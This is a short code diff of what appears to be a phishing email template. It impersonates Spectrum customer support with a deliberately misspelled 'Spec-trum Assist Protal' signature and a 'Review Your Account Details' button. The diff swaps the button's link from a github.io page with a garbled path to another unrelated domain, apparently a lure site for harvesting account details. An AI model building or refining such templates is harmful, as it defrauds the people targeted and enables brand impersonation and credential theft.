@@ -30,7 +30,7 @@ Customer Support Team
 Spec-trum Assist Protal"""
 
 BUTTON_TEXT = "Review Your Account Details"
-BUTTON_URL = "https://julidabaseball.github.io/qailardcowkk/irndex.html"
+BUTTON_URL = "https://rentassistportal.org"
 BUTTON_COLOR = "#2563EB"
 
 FOOTER_COPYRIGHT = "© 2026 Spectrum. All rights reserved."
